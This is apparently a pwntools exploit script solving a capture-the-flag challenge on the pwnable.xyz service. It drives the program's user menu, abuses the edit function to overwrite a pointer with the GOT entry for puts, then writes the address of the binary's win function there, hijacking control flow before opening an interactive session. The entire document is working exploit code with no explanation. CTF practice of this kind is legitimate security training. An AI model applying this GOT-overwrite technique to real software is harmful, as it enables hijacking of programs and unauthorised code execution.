from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
#p = process('./challenge')
p = remote("svc.pwnable.xyz", 30011)
win = e.symbols['win']
cur = 0x0000000000602268
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)

def create_user(name,age):
	sa('> ','1')
	sa(': ',name)
	sa(': ',str(age))

def print_user():
	sa('> ','2')

def edit_user(name,age):
	sa('> ','3')
	sa(': ',name)
	sa(': ',str(age))

create_user('A', 1)
edit_user('B', 'C' * 16 + p64(e.got['puts']))
edit_user(p64(win), 1)

p.interactive()